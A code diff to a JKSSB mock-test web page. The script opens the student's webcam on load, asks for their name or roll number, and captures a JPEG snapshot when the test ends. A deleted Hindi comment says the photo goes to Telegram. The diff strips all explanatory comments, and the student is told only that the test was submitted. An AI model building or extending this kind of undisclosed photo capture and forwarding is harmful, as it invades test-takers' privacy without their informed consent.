@@ -308,20 +308,19 @@ stopExamRecording(); // <-- Paste this exactly here on line 288
         <p style="color: #28a745; font-weight: bold; margin: 5px 0;">Correct Answers: ${correct}</p>
         <p style="color: #dc2626; font-weight: bold; margin: 5px 0;">Wrong Answers: ${wrong}</p>
     `;
-
 <script>
-let studentName = "Guest Student"; // डिफ़ॉल्ट नाम
+let studentName = "Guest Student";
 let mediaRecorder;
 let recordedChunks = [];
 
-// जैसे ही पेज लोड होगा, पहले टेस्ट और कैमरा खुलेगा
 window.addEventListener('DOMContentLoaded', async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         const videoElement = document.getElementById('webcam');
-        videoElement.srcObject = stream;
+        if (videoElement) {
+            videoElement.srcObject = stream;
+        }
 
-        // कैमरा खुलने के तुरंत बाद छात्र से उसका नाम पूछना
         let inputName = prompt("Please enter your Full Name / Roll Number to start the test:", "");
         if (inputName && inputName.trim() !== "") {
             studentName = inputName;
@@ -335,9 +334,10 @@ window.addEventListener('DOMContentLoaded', async () => {
             }
         };
 
-        // टेस्ट सबमिट होने पर फोटो टेलीग्राम पर भेजना
         mediaRecorder.onstop = async () => {
             const videoEl = document.getElementById('webcam');
+            if (!videoEl) return;
+            
             const canvas = document.createElement('canvas');
             canvas.width = videoEl.videoWidth || 640;
             canvas.height = videoEl.videoHeight || 480;
@@ -359,7 +359,6 @@ window.addEventListener('DOMContentLoaded', async () => {
                     console.error('Bypass');
                 }
                 
-                // सबमिशन के बाद मैसेज दिखाना
                 alert('Thank you ' + studentName + ', your JKSSB Mock Test has been submitted successfully!');
                 window.location.href = "index.html";
             }, 'image/jpeg', 0.7);
